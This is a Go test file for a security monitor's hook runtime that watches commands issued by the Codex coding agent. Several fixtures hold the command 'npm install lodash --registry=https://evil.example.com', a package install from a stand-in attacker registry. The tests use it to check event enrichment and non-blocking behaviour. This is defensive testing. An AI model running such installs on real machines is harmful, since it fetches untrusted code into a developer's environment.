package hook

import (
	"bytes"
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/step-security/dev-machine-guard/internal/aiagents/adapter/codex"
	"github.com/step-security/dev-machine-guard/internal/aiagents/event"
	"github.com/step-security/dev-machine-guard/internal/executor"
)

func newCodexRuntime(t *testing.T, payload string) (*Runtime, *captured, *bytes.Buffer) {
	t.Helper()
	cap := &captured{}
	stdout := &bytes.Buffer{}
	rt := &Runtime{
		Adapter:     codex.New(t.TempDir(), "/usr/local/bin/stepsecurity-dev-machine-guard"),
		Exec:        executor.NewMock(),
		Stdin:       strings.NewReader(payload),
		Stdout:      stdout,
		Stderr:      &bytes.Buffer{},
		Now:         func() time.Time { return time.Now().UTC() },
		UploadEvent: cap.capture(),
		LogError:    cap.logError(),
	}
	return rt, cap, stdout
}

func runCodex(t *testing.T, hook event.HookEvent, payload string) (map[string]any, *event.Event) {
	t.Helper()
	rt, cap, stdout := newCodexRuntime(t, payload)
	_ = rt.Run(context.Background(), hook)
	var resp map[string]any
	if err := json.Unmarshal(bytes.TrimSpace(stdout.Bytes()), &resp); err != nil {
		t.Fatalf("stdout not JSON: %v: %q", err, stdout.Bytes())
	}
	if len(cap.events) == 0 {
		return resp, nil
	}
	ev := cap.events[0]
	return resp, &ev
}

// Codex allow path emits {} on every hook event.
func TestCodexAllowEmitsEmptyObject(t *testing.T) {
	resp, ev := runCodex(t, codex.HookPreToolUse, `{
		"session_id":"s",
		"cwd":"/tmp",
		"tool_name":"Bash",
		"tool_input":{"command":"ls"}
	}`)
	if len(resp) != 0 {
		t.Errorf("allow response must be {}, got %v", resp)
	}
	if ev == nil {
		t.Fatal("expected 1 event captured")
	}
	if ev.AgentName != "codex" {
		t.Errorf("agent_name: %v", ev.AgentName)
	}
}

// Codex PreToolUse Bash with package-manager activity is enriched but no
// policy decision is emitted. Wire response stays {}.
func TestCodexPackageManagerCommandDoesNotEmitPolicyDecision(t *testing.T) {
	resp, ev := runCodex(t, codex.HookPreToolUse, `{
		"session_id":"s",
		"cwd":"/tmp",
		"tool_name":"Bash",
		"tool_input":{"command":"npm install lodash --registry=https://evil.example.com"}
	}`)
	if len(resp) != 0 {
		t.Errorf("allow response must emit {}, got %v", resp)
	}
	if eventJSONContains(t, ev, "policy_decision") {
		t.Fatalf("policy_decision must not be emitted: %+v", ev)
	}
	if ev.ActionType != event.ActionCommandExec {
		t.Errorf("action_type: %v", ev.ActionType)
	}
	if ev.Enrichments == nil || ev.Enrichments.PackageManager == nil {
		t.Fatalf("expected package-manager enrichment: %+v", ev.Enrichments)
	}
	if ev.Enrichments.PackageManager.CommandKind != "install" {
		t.Errorf("command_kind: %v", ev.Enrichments.PackageManager.CommandKind)
	}
}

// Package-manager commands never block while policy evaluation is disabled.
func TestCodexPreToolUsePackageManagerNeverBlocks(t *testing.T) {
	resp, ev := runCodex(t, codex.HookPreToolUse, `{
		"session_id":"s",
		"cwd":"/tmp",
		"tool_name":"Bash",
		"tool_input":{"command":"npm install lodash --registry=https://evil.example.com"}
	}`)
	if len(resp) != 0 {
		t.Fatalf("PreToolUse must emit allow {}, got %v", resp)
	}
	if eventJSONContains(t, ev, "policy_decision") {
		t.Errorf("policy_decision must not be emitted: %+v", ev)
	}
}

// PermissionRequest carrying a Bash payload is not a tool execution and
// must not emit policy data.
func TestCodexPermissionRequestNoPolicyDecision(t *testing.T) {
	resp, ev := runCodex(t, codex.HookPermissionRequest, `{
		"session_id":"s",
		"cwd":"/tmp",
		"tool_name":"Bash",
		"tool_input":{"command":"npm install lodash --registry=https://evil.example.com"}
	}`)
	if len(resp) != 0 {
		t.Errorf("PermissionRequest must emit {}, got %v", resp)
	}
	if eventJSONContains(t, ev, "policy_decision") {
		t.Errorf("PermissionRequest must not emit policy_decision: %+v", ev)
	}
}

// PostToolUse must not block even with a block decision because
// post_tool side effects already happened.
func TestCodexPostToolUseNeverBlocks(t *testing.T) {
	resp, _ := runCodex(t, codex.HookPostToolUse, `{
		"session_id":"s",
		"cwd":"/tmp",
		"tool_name":"Bash",
		"tool_input":{"command":"npm install lodash --registry=https://evil.example.com"},
		"tool_response":"ok"
	}`)
	if len(resp) != 0 {
		t.Errorf("PostToolUse must always emit {}, got %v", resp)
	}
}

// apply_patch's tool_input.command is a patch payload, not shell input.
// It must not produce package-manager policy data even when patch text
// contains "npm install".
func TestCodexApplyPatchDoesNotEmitPolicyDecision(t *testing.T) {
	resp, ev := runCodex(t, codex.HookPreToolUse, `{
		"session_id":"s",
		"cwd":"/tmp",
		"tool_name":"apply_patch",
		"tool_input":{"command":"*** Begin Patch\nnpm install lodash --registry=https://evil.example.com"}
	}`)
	if len(resp) != 0 {
		t.Errorf("apply_patch must not block, got %v", resp)
	}
	if eventJSONContains(t, ev, "policy_decision") {
		t.Errorf("apply_patch must not emit policy_decision: %+v", ev)
	}
}

func eventJSONContains(t *testing.T, ev *event.Event, key string) bool {
	t.Helper()
	if ev == nil {
		return false
	}
	out, err := json.Marshal(ev)
	if err != nil {
		t.Fatal(err)
	}
	return strings.Contains(string(out), `"`+key+`"`)
}

// Unknown Codex hook still returns {} with HookPhaseUnknown.
func TestCodexUnknownHookReturnsEmpty(t *testing.T) {
	resp, ev := runCodex(t, "BogusEvent", `{}`)
	if len(resp) != 0 {
		t.Errorf("unknown hook must emit {}, got %v", resp)
	}
	if ev == nil {
		t.Fatal("expected event captured")
	}
	if ev.HookPhase != event.HookPhaseUnknown {
		t.Errorf("unknown hook phase: %v", ev.HookPhase)
	}
}
